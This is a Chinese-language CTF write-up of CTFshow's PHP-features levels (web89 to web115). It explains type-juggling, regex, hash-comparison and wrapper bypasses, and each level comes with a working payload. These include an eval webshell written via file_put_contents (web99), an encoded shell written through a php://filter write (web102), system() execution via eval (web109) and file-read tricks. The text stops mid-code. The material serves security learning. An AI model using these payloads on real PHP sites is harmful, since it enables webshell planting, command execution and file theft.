# CTFSHOW php 特性

**目录**

[TOC]





## web89 数组绕过正则



```php
 
include("flag.php");
highlight_file(__FILE__);
 
if(isset($_GET['num'])){
    $num = $_GET['num'];
get num
    if(preg_match("/[0-9]/", $num)){
是数字 就输出 no
        die("no no no!");
    }
    if(intval($num)){
如果是存在整数 输出 flag
        echo $flag;
    }
}
```

这个使用数组就可以绕过正则

这里学一下

### PHP preg_match() 函数 | 菜鸟教程

```cobol
?num[0]=1
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/82e506f34a93a04447f36c0a1c35ff87.png" alt="" style="max-height:241px; box-sizing:content-box;" />


## web90  ===的绕过

```cobol
 
include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==="4476"){
        die("no no no!");
    }
    if(intval($num,0)===4476){
        echo $flag;
    }else{
        echo intval($num,0);
    }
} 
```

### 首先 我们输入一个 4476a 就可以绕过 第一个nonono

```php
<?php
$num='4476a';
echo intval($num,0);
 
?>
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/7ad739b871a895376cd2b082a67a2233.png" alt="" style="max-height:93px; box-sizing:content-box;" />


这样 就绕过了 第二个 ===

### 也可以使用浮点型

```php
<?php
$num=4476.1;
echo intval($num,0);
 
?>
```

### 也可以使用进制



<img src="https://i-blog.csdnimg.cn/blog_migrate/bf23a93312cb5ee6ac3a0e9eeab142c4.png" alt="" style="max-height:306px; box-sizing:content-box;" />




```scss
intval($num,0)
```

设置第二个参数为0  如果识别到 0x 那么就自动 转为 16进制取整

```php
<?php
$num=0x117c;
echo intval($num,0);
 
?>
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/5e6986cde11e7f8f1322d010684d8eae.png" alt="" style="max-height:124px; box-sizing:content-box;" />




## web91   了解正则

```php
include('flag.php');
$a=$_GET['cmd'];
if(preg_match('/^php$/im', $a)){
    if(preg_match('/^php$/i', $a)){
        echo 'hacker';
    }
    else{
        echo $flag;
    }
}
else{
    echo 'nonononono';
} 
```

第一个if

```cobol
/^phpA$/  以php为开头的字符串 并且以php结尾的字符串 就是php
 
/im 多行匹配和匹配大小写
```

第二个 就是 取消了多行匹配的机制 并且让我们

意思就是单行无法匹配到php开头的字符串

这个时候可以使用url编码的换行符 %0a

```cobol
?cmd=%0aphp
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/839afaf9ab25f07bff47cd03ac1c5fab.png" alt="" style="max-height:226px; box-sizing:content-box;" />


## web92 == 绕过



<img src="https://i-blog.csdnimg.cn/blog_migrate/274cc09d7e5f1e94b1cb1d2621757740.png" alt="" style="max-height:328px; box-sizing:content-box;" />




用之前的方法也可以

### 进制



<img src="https://i-blog.csdnimg.cn/blog_migrate/064d43de5f8b261a3a46db39e857aba0.png" alt="" style="max-height:604px; box-sizing:content-box;" />


### 浮点型



<img src="https://i-blog.csdnimg.cn/blog_migrate/25376d6e124fea92f8b1eb257ef2726b.png" alt="" style="max-height:625px; box-sizing:content-box;" />


但是我们不能使用 4476a来绕过== 因为他不管比较的双方的类型

只要值相同就相同

我们输入 4476a  他读取到4476  就会和 另一方进行比较

这样 就绕不过去

### 科学计数法

但是我们可以使用字母e 因为在 计算机中 e有科学计数法的用法

当我们输入 4476e1 == 就会直接识别为 4476e1

绕过第一个 ==

## web93 过滤字母

```php
include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==4476){
        die("no no no!");
    }
    if(preg_match("/[a-z]/i", $num)){
        die("no no no!");
    }
    if(intval($num,0)==4476){
        echo $flag;
    }else{
        echo intval($num,0);
    } 
```

能发现不能使用科学计数法了

### 浮点型

4476.1



<img src="https://i-blog.csdnimg.cn/blog_migrate/34b22a3028b6d711d2107eba5db4b8ec.png" alt="" style="max-height:647px; box-sizing:content-box;" />


### 进制

我们使用八进制 因为八进制 只要识别到0开头就默认为八进制



<img src="https://i-blog.csdnimg.cn/blog_migrate/9c2645162d2c5fa90d57f2b95cb9957d.png" alt="" style="max-height:313px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/b74ac176b65ca97ecb5c52149d1a45e3.png" alt="" style="max-height:675px; box-sizing:content-box;" />


## web94 strpos(字符串，字符)

```php
include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==="4476"){
        die("no no no!");
    }
    if(preg_match("/[a-z]/i", $num)){
匹配 所有字母 并且不区分大小写
        die("no no no!");
    }
    if(!strpos($num, "0")){
当 0 出现在开头 就报错
这里可能是想过滤 八进制
        die("no no no!");
    }
    if(intval($num,0)===4476){
        echo $flag;
    } 
```

题目想过滤八进制 但是 其实还是可以使用八进制

### 八进制

```cobol
?num=  010574
```

前面添加一个空格即可



<img src="https://i-blog.csdnimg.cn/blog_migrate/689b3f856ad766a86b0caf43a4d49e97.png" alt="" style="max-height:169px; box-sizing:content-box;" />


### 浮点型

```cobol
?num=4476.01
```

这题主要是注意函数

strpos(字符串，字符)  查找字符在字符串第一次出现的位置

所以这个函数就是找到0出现的位置 并且不能让0 在开头

但是我们可以空格绕过

## web95 /[a-z]|\./i  正则过滤

```php
 
include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==4476){
        die("no no no!");
    }
    if(preg_match("/[a-z]|\./i", $num)){
这里又重新过滤了 .  说明浮点型也不行了
        die("no no no!!");
    }
    if(!strpos($num, "0")){
        die("no no no!!!");
    }
    if(intval($num,0)===4476){
        echo $flag;
    }
}
```

那就只能使用

### 八进制

```cobol
?num=  010574
?num=+010574
```

## web96  路径读取、伪协议

```cobol
 
 
highlight_file(__FILE__);
 
if(isset($_GET['u'])){
    if($_GET['u']=='flag.php'){
        die("no no no");
    }else{
        highlight_file($_GET['u']);
高亮 flag
这里可以判断 
    }
 
 
}
```

hightlight_file(高亮文件的绝对路径,返回值) 其中返回值可选

这里很明显要我们输入flag的路径

那我们测一下

```cobol
./flag.php   ./表示在当前目录下
../html/flag.php      ../ 表示父级目录 然后访问html中的flag
php://filter/read/resource=flag.php 伪协议
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/549fc980ce4de2b64ccb3c3977445f82.png" alt="" style="max-height:323px; box-sizing:content-box;" />


## web97 数组绕过md5比较

```php
 
include("flag.php");
highlight_file(__FILE__);
if (isset($_POST['a']) and isset($_POST['b'])) {
if ($_POST['a'] != $_POST['b'])
if (md5($_POST['a']) === md5($_POST['b']))
echo $flag;
else
print 'Wrong.';
}
?> 
 
 
```

通过数组可以绕过MD5的比较



<img src="https://i-blog.csdnimg.cn/blog_migrate/89106d84693d4b1e4a0e7b5497c4c71e.png" alt="" style="max-height:320px; box-sizing:content-box;" />


## web98    三目运算符

 [https://www.cnblogs.com/echoDetected/p/13999517.html](https://www.cnblogs.com/echoDetected/p/13999517.html) 

 [https://www.cnblogs.com/NPFS/p/13798533.html](https://www.cnblogs.com/NPFS/p/13798533.html) 

说是三目运算符

```cobol
$_GET?$_GET=&$_POST:'flag'; 
 
如果get请求存在 那么就通过 post来覆盖掉get请求
这里意思 就是 如果$_GET为真 那么就执行$_GET=&$_POST  否则执行'flag'
 
$_GET['flag']=='flag'?$_GET=&$_COOKIE:'flag';
$_GET['flag']=='flag'?$_GET=&$_SERVER:'flag'; 
 
这两个就是 比对get 是否为 flag
 
如果get接受的参数值为 flag 那就设置&$_COOKIE和&$_SERVER为flag
 
highlight_file($_GET['HTTP_FLAG']=='flag'?$flag:__FILE__); 
 
如果get的参数为 http_flag 并且内容为 flag
 
那么就输出  http_flag的地址
```

所以这里我们 get的值不能为flag 不然就会设置get为空

然后我们设置post为 HTTP_FLAG=flag



<img src="https://i-blog.csdnimg.cn/blog_migrate/58fcf6a5a120f0e64f2c95385233c0ed.png" alt="" style="max-height:211px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/7f536f3d6129a178c07a3c830499522c.png" alt="" style="max-height:139px; box-sizing:content-box;" />


## web99  file_put_contents写入 in_array漏洞

```cobol
highlight_file(__FILE__);
$allow = array();
设为数组
for ($i=36; $i < 0x36d; $i++) { 
    array_push($allow, rand(1,$i));
向尾部插入 rand(1,$i) 循环 54次
}
if(isset($_GET['n']) && in_array($_GET['n'], $allow)){
    file_put_contents($_GET['n'], $_POST['content']);
将post的content 写入 get的文件中
如果get不存在 那么就创建文件
}
 
?> 
```

这里发现可以写东西到服务器中

那我们就想到一句话木马

这里主要是 in_array 存在漏洞

```cobol
如果 in_array 的第三个参数不设置为 true 就不会比较类型
我们输入 1.php  他会自动识别和 allow一样的类型
 
为 1 
```

这里我们看看

```php
get： ?n=1.php
post: content=<?php @eval($_POST['a']);?>
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/c235fb5768829f589832aa898920198d.png" alt="" style="max-height:510px; box-sizing:content-box;" />


## web100 优先级

```cobol
highlight_file(__FILE__);
include("ctfshow.php");
//flag in class ctfshow;
提示我们 在 ctfshow类中
$ctfshow = new ctfshow();
$v1=$_GET['v1'];
$v2=$_GET['v2'];
$v3=$_GET['v3'];
3个参数
$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
第四个参数是 前三个相与
 
if($v0){
    if(!preg_match("/\;/", $v2)){
就是不能在v2中招到 分号;
        if(preg_match("/\;/", $v3)){
要在 v3中找到  分号;
            eval("$v2('ctfshow')$v3");
执行 v2 ('ctfshow')v3
这里 就发现v2 是命令 v3多半就分号 ;
        }
    }
    
}
```

第一个if判断

```cobol
<?php
$v1=1;
数字
$v2="sb";
字符串
$v3=";";
字符
$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3); 
echo $v0;
?>
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/935532153c7d3ca51c4cfbf098bf2de7.png" alt="" style="max-height:197px; box-sizing:content-box;" />
  


```cobol
这里的原理是 = 大于 and 和 or
 
这样 v0=1 and 0 and 0 还是1
```

这样就绕过了第一个if

我们知道了 两个的类型

v2 命令

v3分号

这样我们就看看

如何输出

```scss
var_dump() 可以用于识别类型 并且输出 表达式的类型和值
```

 [PHP var_dump() 函数 | 菜鸟教程](https://www.runoob.com/php/php-var_dump-function.html) 

我们让v2=var_dump($ctfshow)

v3=;

这样就构造了

var_dump($ctfshow)('ctfshow');



<img src="https://i-blog.csdnimg.cn/blog_migrate/6a9df67841709d05b28332739e8254ce.png" alt="" style="max-height:145px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/3c084d0d409443d48e6ea10ef3d0e652.png" alt="" style="max-height:174px; box-sizing:content-box;" />


成功返回值了

我们继续尝试

```cobol
?v1=1&v2=var_dump($ctfshow)&v3=;
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/5a02991febfe0dfc716375d5232daa64.png" alt="" style="max-height:259px; box-sizing:content-box;" />


还有一个方式

就是

通过注释来绕过



<img src="https://i-blog.csdnimg.cn/blog_migrate/a5f2146d385a469c56b723d7b762083f.png" alt="" style="max-height:101px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/4734e00ba89adab80fa739b14d0fbdc7.png" alt="" style="max-height:152px; box-sizing:content-box;" />




```cobol
payload1: ?v1=1&v2=var_dump($ctfshow)&v3=;
payload2: ?v1=1&v2=var_dump($ctfshow)/*&v3=*/;
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/871e4d6aaa08503e3674243706afd60d.png" alt="" style="max-height:339px; box-sizing:content-box;" />


## web101  反射API

这个 是关于面向对象

存在一个 反射api

ReflectionClass 用于输出 类的详细信息

创建方式为 new ReflectionClass

可以使用echo ReflectionClass("ClassName" ) 输出类的信息

这里就可以使用这个来

```cobol
?v1=1&v2=echo new ReflectionClass&v3=;
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/d70c731f8fda7baca31a2450f108ad7b.png" alt="" style="max-height:198px; box-sizing:content-box;" />


最后需要爆破最后一位

最后一位是 6

## web102 PHP短开表达式 回调函数call_user_func

```cobol
 
 
highlight_file(__FILE__);
$v1 = $_POST['v1'];
$v2 = $_GET['v2'];
$v3 = $_GET['v3'];
$v4 = is_numeric($v2) and is_numeric($v3);
if($v4){
    $s = substr($v2,2);
从v2 的第二位开始读取
    $str = call_user_func($v1,$s);
然后使用回调函数
这里 $s会作为参数 被 $v1调用
这就是另一个调用函数的方式罢了
    echo $str;
    file_put_contents($v3,$str);
写入v3中
}
else{
    die('hacker');
}
```

这里我们首先要用v2来绕过 第一个if

这里介绍两个函数

```cobol
bin2hex
和
hex2bin
 
这两个是 字符串 和 十六进制字符串 互相变换的函数
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/4f5f3421afeedb8c00569f9ac8bc6ea9.png" alt="" style="max-height:239px; box-sizing:content-box;" />


我们思考 第一个if 需要是数字 然后绕过

那我们是不是可以生成一个十六进制字符串 然后绕过

这里的读取命令是特殊构造的 需要绕过is_numeric()

可以通过科学计数法绕过

这里提及PHP短开表达式

```php
<?=`cat *`;
 
 
 
 
<?=(表达式)?>
相当于
<?php echo (表达式);?>
```

然后我们通过伪协议 通过解密base64写入文件

以为这个特殊构造的命令是 要先base64加密 然后通过 bin2hex 转换字符串

就可以形成特殊的 科学计数法形式



<img src="https://i-blog.csdnimg.cn/blog_migrate/8803130d9704b4e945a434b10927113a.png" alt="" style="max-height:566px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/1672342d3277a83bab389ff38987e5df.png" alt="" style="max-height:508px; box-sizing:content-box;" />


这里最后的= 可以删除 不删除就无法绕过

```cobol
50 44 38 39 59 47 4e 68 64 43 41 71 59 44 73
```

然后可以开始写入

```cobol
payload
 
get :   v2=005044383959474e6864434171594473&v3=php://filter/write=convert.base64-decode/resource=34.php
       
 
post:   v1=hex2bin
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/0718559264bcf546e4971b2bd472b3bb.png" alt="" style="max-height:668px; box-sizing:content-box;" />


这样就绕过了

## web103

```cobol
highlight_file(__FILE__);
$v1 = $_POST['v1'];
$v2 = $_GET['v2'];
$v3 = $_GET['v3'];
$v4 = is_numeric($v2) and is_numeric($v3);
if($v4){
    $s = substr($v2,2);
    $str = call_user_func($v1,$s);
    echo $str;
    if(!preg_match("/.*p.*h.*p.*/i",$str)){
        file_put_contents($v3,$str);
    }
    else{
        die('Sorry');
    }
}
else{
    die('hacker');
}
```

加了个过滤条件

但是还是可以通过 102的方式直接做



<img src="https://i-blog.csdnimg.cn/blog_migrate/539161485b2bb566074a95989199c2fc.png" alt="" style="max-height:597px; box-sizing:content-box;" />


## web104 shal弱比较的绕过

```cobol
highlight_file(__FILE__);
include("flag.php");
 
if(isset($_POST['v1']) && isset($_GET['v2'])){
    $v1 = $_POST['v1'];
    $v2 = $_GET['v2'];
    if(sha1($v1)==sha1($v2)){
        echo $flag;
    }
} 
```

这里主要是 shal 的比较

其实shal和MD5一样 可以通过数组绕过



<img src="https://i-blog.csdnimg.cn/blog_migrate/1172ecbc5466fc48389af7c442cff59f.png" alt="" style="max-height:338px; box-sizing:content-box;" />


## web105  变量覆盖

```cobol
 <?php
 
/*
# -*- coding: utf-8 -*-
# @Author: Firebasky
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-28 22:34:07
 
*/
 
highlight_file(__FILE__);
include('flag.php');
error_reporting(0);
$error='你还想要flag嘛？';
$suces='既然你想要那给你吧！';
foreach($_GET as $key => $value){
    if($key==='error'){
        die("what are you doing?!");
    }
    $$key=$$value;
}foreach($_POST as $key => $value){
    if($value==='flag'){
        die("what are you doing?!");
    }
    $$key=$$value;
}
if(!($_POST['flag']==$flag)){
    die($error);
}
echo "your are good".$flag."\n";
die($suces);
 
?>
你还想要flag嘛？
```

首先来分析一下

```cobol
GET
if($key==='error')
 
POST
if($value==='flag')
 
如果get的内容为 error 那么报错
如果post内容为flag 那么就报错
 
 
否则就将key内容设置为value的值
 
```

```cobol
if(!($_POST['flag']==$flag)){
    die($error);
}
echo "your are good".$flag."\n";
die($suces);
 
 
这一段代码就是我们得到flag的方式
 
1.如果 error将变量flag输出
 
只需要将flag的值覆盖到error上即可
 
GET
 
x=flag
 
POST
 
error=x
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/ad456011e34bb6dd951b34029903976b.png" alt="" style="max-height:310px; box-sizing:content-box;" />




```cobol
2.通过suces输出flag
 
 
GET
?suces=flag&flag=
 
这里首先将suces的值设置为 flag
 
然后又将 flag设置为空
 
这样就绕过了
 
if(!($_POST['flag']==$flag)){
    die($error);
} 
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/761c1b02691ce891ef5b6bea3e0ddfff.png" alt="" style="max-height:216px; box-sizing:content-box;" />


## web106

```cobol
<?php
 
/*
# -*- coding: utf-8 -*-
# @Author: atao
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-28 22:38:27
 
*/
 
 
highlight_file(__FILE__);
include("flag.php");
 
if(isset($_POST['v1']) && isset($_GET['v2'])){
    $v1 = $_POST['v1'];
    $v2 = $_GET['v2'];
    if(sha1($v1)==sha1($v2) && $v1!=$v2){
        echo $flag;
    }
}
 
 
 
?> 
```

shal可以通过数组绕过

```cobol
?v2[]=1
 
 
v1[]=2
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/04da87b9182baef5b0406c18a9b75d6b.png" alt="" style="max-height:106px; box-sizing:content-box;" />


## web107  特殊的md ‘科学计数法’

```cobol
<?php
 
/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-28 23:24:14
 
*/
 
 
highlight_file(__FILE__);
error_reporting(0);
include("flag.php");
 
if(isset($_POST['v1'])){
    $v1 = $_POST['v1'];
    $v3 = $_GET['v3'];
       parse_str($v1,$v2);
       if($v2['flag']==md5($v3)){
           echo $flag;
       }
 
}
 
 
 
?> 
```

看看函数

parse_str()

```php
<?php
parse_str("name=Bill&age=60");
echo $name."<br>";
echo $age;
?>
```

这里给出

```php
parse_str(string,array)
```

所以 v1是stringv2是array 就是数组名

所以我们要让 v2里面的数组 存在 flag

并且他的值要和v3的md5一样

这里我们就直接payload

```cobol
GET 
 
?v3=1
 
 
POST
 
v1=flag=c4ca4238a0b923820dcc509a6f75849b
```

这样 v2就存在 flag->c4ca4238a0b923820dcc509a6f75849b的数组

其中 c4ca4238a0b923820dcc509a6f75849b就是1 的md5值

这里还存在另一个做法

首先我们注意是弱比较

==

这里就存在另一个payload

```cobol
?v3=240610708
 
 
 
v1=flag=0
```

原理 是 240610708 的md5是0e462097431906509019562988736854

这里就类科学计数法 这样 == 就会识别为0

那么 就得到flag

## web108  ereg的00截断漏洞

```cobol
 
highlight_file(__FILE__);
error_reporting(0);
include("flag.php");
 
if (ereg ("^[a-zA-Z]+$", $_GET['c'])===FALSE)  {
    die('error');
 
}
//只有36d的人才能看到flag
if(intval(strrev($_GET['c']))==0x36d){
    echo $flag;
}
 
?>
error
```

首先我们要先了解函数

### 第一个函数 ereg

```cobol
if (ereg ("^[a-zA-Z]+$", $_GET['c'])===FALSE)  {
    die('error');
 
 
首先匹配一个或多个由字母组成的字符串
 
ereg（）函数：字符串对比解析，区分大小写
 
这里的意思就是 c  必须是字母的字符串
```

### 接下来是下一个strrev

这个是反装字符串 我们输入 d63x0 就会输出 0x36d

所以这道题需要我们并且还是需要通过intval来转换为整数

这里我们就需要绕过ereg 这样我们才可以输入数字

ereg存在00截断的漏洞

所以我们 通过 a%00 即可绕过

我们只需要通过 778 就可以让intval 识别为 0x36d

所以paylaod是

```cobol
?c=a%00778
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/015f294aaa13600a9d464b594ddbcb6a.png" alt="" style="max-height:170px; box-sizing:content-box;" />


## web109  _toString类 遇到echo new 内置类

```cobol
<?php
 
/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-29 22:02:34
 
*/
 
 
highlight_file(__FILE__);
error_reporting(0);
if(isset($_GET['v1']) && isset($_GET['v2'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];
 
    if(preg_match('/[a-zA-Z]+/', $v1) && preg_match('/[a-zA-Z]+/', $v2)){
            eval("echo new $v1($v2());");
    }
 
}
 
?> 
```

首先 echo new 执行新类 那么就说明 我们执行的类需要有 _toString的方法

就是能直接返回值

其次我们需要了解 php中存在嵌套的函数调用

```php
$a='phpinfo';
那么
$a=phpinfo();
 
相当
```

那我们只需要通过 _toSring方法输出即可

找到符合条件的异常类Exception以及反射类ReflectionClass

所以我们使用随便取一个作为payload

```cobol
?v1=ReflectionClass&v2=system(ls)
 
 
这里会变为 echo new ReflectionClass(system(ls)());
 
会先执行命令 然后报错 
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/0d9f58f37b4d317a0ee7d64080dce0b6.png" alt="" style="max-height:94px; box-sizing:content-box;" />


```cobol
?v1=ReflectionClass&v2=highlight_file("fl36dg.txt")
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/f6a66276a9054a150c0734db9493c69b.png" alt="" style="max-height:282px; box-sizing:content-box;" />


## web110  内置类 FilesystemIterator 读取文件目录  getcwd函数

```cobol
<?php
 
/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-29 22:49:10
 
*/
 
 
highlight_file(__FILE__);
error_reporting(0);
if(isset($_GET['v1']) && isset($_GET['v2'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];
 
    if(preg_match('/\~|\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/', $v1)){
            die("error v1");
    }
    if(preg_match('/\~|\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/', $v2)){
            die("error v2");
    }

    eval("echo new $v1($v2());");

}

?> 
```

过滤了数字和符号

这里又要使用另一个内置类迭代器FilesystemIterator

构造方法是目录

```php
<?php
$iterator = new FilesystemIterator('.');  // 创建当前目录的迭代器
 
while ($iterator->valid()) { // 检测迭代器是否到底了
    echo $iterator->getFilename(), ':', $iterator->getCTime(), PHP_EOL;
    $iterator->next();  // 游标往后移动
}
?>
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/453e76df307c610f0be20de5cfe0e12a.png" alt="" style="max-height:162px; box-sizing:content-box;" />


那么我们如何获取当前目录 可以使用 getcwd函数

那么payload就出现了

```cobol
?v1=FilesystemIterator&v2=getcwd
 
getcwd()：获取当前文件目录
FilesystemIterator&遍历文件的类
DirctoryIntrerator 遍历目录的类
```

但是我们无法读取 直接访问文件即可



<img src="https://i-blog.csdnimg.cn/blog_migrate/c72da9b0826403a08389efd6d99f3a26.png" alt="" style="max-height:291px; box-sizing:content-box;" />


## web111 超全局变量  $GOLBALS

```cobol
<?php
 
/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-30 02:41:40
 
*/
 
highlight_file(__FILE__);
error_reporting(0);
include("flag.php");
 
function getFlag(&$v1,&$v2){
    eval("$$v1 = &$$v2;");
    var_dump($$v1);
}
 
 
if(isset($_GET['v1']) && isset($_GET['v2'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];
 
    if(preg_match('/\~| |\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\<|\>/', $v1)){
            die("error v1");
    }
    if(preg_match('/\~| |\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\<|\>/', $v2)){
            die("error v2");
    }
    
    if(preg_match('/ctfshow/', $v1)){
            getFlag($v1,$v2);
    }
    

    


}

?> 
```

这题主要是

```cobol
function getFlag(&$v1,&$v2){
    eval("$$v1 = &$$v2;");
    var_dump($$v1);
} 
 
 
看样子是输出 v1 其实是输出v2
 
    
    if(preg_match('/ctfshow/', $v1)){
            getFlag($v1,$v2);
    }
    
 
v1中需要有 ctfshow 的字符串
 
 
那么我们就存入ctfshow
```

这里我们可以使用 GLOBALS 来通过 var_dump输出全局变量



<img src="https://i-blog.csdnimg.cn/blog_migrate/15a90a5194a0cd1894af5b6804cbb831.png" alt="" style="max-height:614px; box-sizing:content-box;" />


所以payload就出现了

```cobol
?v1=ctfshow&v2=GLOBALS
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/289bf6332a3f9d05f647752943393e6c.png" alt="" style="max-height:132px; box-sizing:content-box;" />


## web112 is_file 和highlight_file对于伪协议的判断

```cobol
<?php
 
/*
# -*- coding: utf-8 -*-
# @Author: Firebasky
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-30 23:47:49
 
*/
 
highlight_file(__FILE__);
error_reporting(0);
function filter($file){
    if(preg_match('/\.\.\/|http|https|data|input|rot13|base64|string/i',$file)){
        die("hacker!");
    }else{
        return $file;
    }
}
$file=$_GET['file'];
if(! is_file($file)){
    highlight_file(filter($file));
}else{
    echo "hacker!";
} 
```

is_file认为伪协议不是文件，highlight_file认为伪协议是文件

这题目需要我们传入的东西不是文件 但是需要通过 highlight_file来输出

那么很显然就使用伪协议来读取一下

所以我们直接通过伪协议查看

payload

```cobol
php://filter/convert.quoted-printable-encode/resource=flag.php
```

## web113 过滤了 filter 使用

```cobol
 <?php
 
/*
# -*- coding: utf-8 -*-
# @Author: Firebasky
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-30 23:47:52
 
*/
 
highlight_file(__FILE__);
error_reporting(0);
function filter($file){
    if(preg_match('/filter|\.\.\/|http|https|data|data|rot13|base64|string/i',$file)){
        die('hacker!');
    }else{
        return $file;
    }
}
$file=$_GET['file'];
if(! is_file($file)){
    highlight_file(filter($file));
}else{
    echo "hacker!";
} 
```

过滤了 filter过滤器

使用其他的伪协议

```cobol
compress.zlib://flag.php
```

### 目录溢出

预期是目录溢出

首先了解linux下的目录

```cobol
/proc/self/root
```

是指向 linux文件的根目录



<img src="https://i-blog.csdnimg.cn/blog_migrate/b42a9d423bef41835212b1fe1ba63c5d.png" alt="" style="max-height:81px; box-sizing:content-box;" />


并且 is_file 对文件名的判断存在长度限制 并且需要传入的是绝对路径

那么我们可以构造一个一直访问根目录 来绕过绝对路径

```cobol
/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root
```

这个时候 会无法访问到文件 而一直访问文件夹

当达到预定长度后 就会实现目录溢出

```cobol
/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/1676667e9da548316f89a0c84c0bf606.png" alt="" style="max-height:125px; box-sizing:content-box;" />




## web114



```cobol
 <?php
 
/*
# -*- coding: utf-8 -*-
# @Author: Firebasky
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-01 15:02:53
 
*/
 
error_reporting(0);
highlight_file(__FILE__);
function filter($file){
    if(preg_match('/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i',$file)){
        die('hacker!');
    }else{
        return $file;
    }
}
$file=$_GET['file'];
echo "师傅们居然tql都是非预期 哼！";
if(! is_file($file)){
    highlight_file(filter($file));
}else{
    echo "hacker!";
} 师傅们居然tql都是非预期 哼！ <?php 
```

把filter放出来了 直接通过 filter读取即可

## web115  is_numeric和trim双检测

```cobol
 <?php
 
/*
# -*- coding: utf-8 -*-
# @Author: Firebasky
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-01 15:08:19
 
*/
 
include('flag.php');
highlight_file(__FILE__);
error_reporting(0);
function filter($num){
    $num=str_replace("0x","1",$num);
    $num=str_replace("0","1",$num);
    $num=str_replace(".","1",$num);
    $num=str_replace("e","1",$num);
    $num=str_replace("+","1",$num);
    return $num;
}
$num=$_GET['num'];
if(is_numeric($num) and $num!=='36' and trim($num)!=='36' and filter($num)=='36'){
    if($num=='36'){
        echo $flag;
    }else{
        echo "hacker!!";
    }
}else{
    echo "hacker!!!";
} hacker!!!
```

```cobol
function filter($num){
    $num=str_replace("0x","1",$num);
    $num=str_replace("0","1",$num);
    $num=str_replace(".","1",$num);
    $num=str_replace("e","1",$num);
    $num=str_replace("+","1",$num);
    return $num;
} 
 
十六进制 八进制 浮点数 科学计数法 开头绕过
 
全被ban了
 
 
if(is_numeric($num) and $num!=='36' and trim($num)!=='36' and filter($num)=='36')
 
 
首先需要整数   不能为36  开头删除空白后 不能等于36 并且ban了上面的
```

这里主要是通过师傅的测试来学习更深入学习 php

首先我们这里了解到 主要就是 is_numeric和trim两个函数

那我们做个测试看看

```php
<?php
for($i=0;$i<128;$i++){
